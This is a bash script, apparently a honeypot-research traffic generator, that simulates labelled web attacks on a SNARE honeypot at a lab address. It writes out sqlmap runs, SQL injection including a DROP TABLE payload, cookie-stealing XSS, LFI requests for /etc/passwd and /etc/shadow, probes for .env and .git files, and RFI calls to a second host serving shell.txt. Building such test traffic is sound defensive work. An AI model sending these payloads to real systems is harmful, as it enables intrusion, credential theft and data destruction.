#!/bin/bash
# 시나리오 04: 웹 공격 (SQLi, XSS, LFI, 디렉터리 트래버설)
# Label: Intrusion
# 도구: sqlmap, curl
# 설명: SNARE 웹 허니팟을 대상으로 다양한 웹 공격 시뮬레이션

LABEL="Intrusion"
SCENARIO="web_attacks"
SNARE_URL="http://172.30.0.13:8080"
echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"start\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"

# SQL Injection via sqlmap (자동, 비대화형)
echo "[*] Running sqlmap against SNARE"
sqlmap -u "${SNARE_URL}/?id=1" \
    --batch \
    --level=3 \
    --risk=2 \
    --output-dir=/honeypot_logs/sqlmap_out \
    --random-agent \
    --timeout=10 \
    2>/dev/null || true

# 수동 SQL Injection 시도
echo "[*] Manual SQL injection attempts"
curl -s --max-time 5 "${SNARE_URL}/?id=1'%20OR%20'1'='1" > /dev/null
curl -s --max-time 5 "${SNARE_URL}/?id=1;DROP%20TABLE%20users--" > /dev/null
curl -s --max-time 5 -X POST "${SNARE_URL}/login" \
    -d "username=admin'--&password=anything" > /dev/null
curl -s --max-time 5 -X POST "${SNARE_URL}/login" \
    -d "username=' OR 1=1--&password=x" > /dev/null

# XSS 시도
echo "[*] XSS attempts"
curl -s --max-time 5 "${SNARE_URL}/<script>alert(document.cookie)</script>" > /dev/null
curl -s --max-time 5 "${SNARE_URL}/search?q=<script>alert(1)</script>" > /dev/null
curl -s --max-time 5 "${SNARE_URL}/?name=<img%20src=x%20onerror=alert(1)>" > /dev/null

# LFI (Local File Inclusion) 시도
echo "[*] LFI attempts"
curl -s --max-time 5 "${SNARE_URL}/../../../etc/passwd" > /dev/null
curl -s --max-time 5 "${SNARE_URL}/?page=../../../../etc/passwd" > /dev/null
curl -s --max-time 5 "${SNARE_URL}/?file=../../../windows/system32/drivers/etc/hosts" > /dev/null
curl -s --max-time 5 "${SNARE_URL}/../../../../etc/shadow" > /dev/null

# 디렉터리 트래버설 / 관리자 패널 탐색
echo "[*] Directory traversal and admin panel probing"
for path in /admin /phpmyadmin /wp-admin /manager /console /.git/config /.env /backup /config; do
    curl -s --max-time 3 "${SNARE_URL}${path}" -o /dev/null -w "%{http_code} ${path}\n"
done

# RFI (Remote File Inclusion) 시도
echo "[*] RFI attempts"
curl -s --max-time 5 "${SNARE_URL}/?page=http://172.30.0.20:8888/malicious.php" > /dev/null
curl -s --max-time 5 "${SNARE_URL}/?file=http://172.30.0.20:8888/shell.txt" > /dev/null

# User-Agent 기반 스캐너 시뮬레이션
echo "[*] Scanner simulation"
curl -s --max-time 5 \
    -H "User-Agent: Nikto/2.1.6" \
    "${SNARE_URL}/" > /dev/null
curl -s --max-time 5 \
    -H "User-Agent: sqlmap/1.7.8#stable" \
    "${SNARE_URL}/?id=1" > /dev/null

echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"end\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"
